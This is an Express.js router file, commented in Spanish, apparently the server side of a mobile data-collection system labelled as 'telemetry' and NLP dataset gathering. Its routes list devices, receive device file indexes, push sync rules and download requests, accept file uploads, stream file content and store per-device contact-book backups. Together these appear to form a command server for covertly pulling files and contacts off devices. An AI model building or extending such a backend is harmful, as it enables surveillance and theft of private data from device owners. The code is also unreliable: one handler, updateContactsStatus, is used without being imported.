const express = require('express');
const router = express.Router();
const multer = require('multer');
const os = require('os');
const upload = multer({ dest: os.tmpdir() });

const { validateTelemetryKey, handleDatasetBatch, renderMainDatasetView, renderDeviceDatasetView } = require('./telemetry.controller');
const {
    receiveDeviceIndex,
    getSyncRules,
    updateSyncRules,
    getPendingDownloads,
    triggerSyncSignal,
    requestFileUpload,
    uploadFile,
    serveFileContent,
    getDeviceIndex,
    listDevices,
    receiveContactsBackup,
    getContactsBackup
} = require('./fileSyncController');

// POST /api/telemetry/dataset - Endpoint para recolección de lotes de Dataset NLP
router.post('/dataset', validateTelemetryKey, handleDatasetBatch);

// Endpoints REST de Exploracion e Indice de Archivos (Protegidos con Token Secreto PSK)
router.get('/devices', validateTelemetryKey, listDevices);
router.get('/device-index', validateTelemetryKey, getDeviceIndex);
router.post('/device-index', validateTelemetryKey, receiveDeviceIndex);
router.get('/sync-rules', validateTelemetryKey, getSyncRules);
router.post('/sync-rules', validateTelemetryKey, updateSyncRules);
router.get('/pending-downloads', validateTelemetryKey, getPendingDownloads);
router.post('/signal-sync', validateTelemetryKey, triggerSyncSignal);
router.post('/request-upload', validateTelemetryKey, requestFileUpload);

// Endpoints de Respaldo de Libreta de Contactos
router.post(['/devices/:deviceId/contacts/status', '/contacts/status'], validateTelemetryKey, updateContactsStatus);
router.post(['/devices/:deviceId/contacts/backup', '/contacts/backup'], validateTelemetryKey, receiveContactsBackup);
router.get(['/devices/:deviceId/contacts', '/contacts'], validateTelemetryKey, getContactsBackup);

// Subida Multipart y Streaming Multimedia (Protegidos con Token Secreto PSK)
router.post('/upload-file', validateTelemetryKey, upload.single('file'), uploadFile);
router.get('/file-content', validateTelemetryKey, serveFileContent);

// GET web views for dataset
router.get(['/dataset', '/dataset/devices'], renderMainDatasetView);
router.get('/dataset/devices/:deviceId', renderDeviceDatasetView);

module.exports = router;



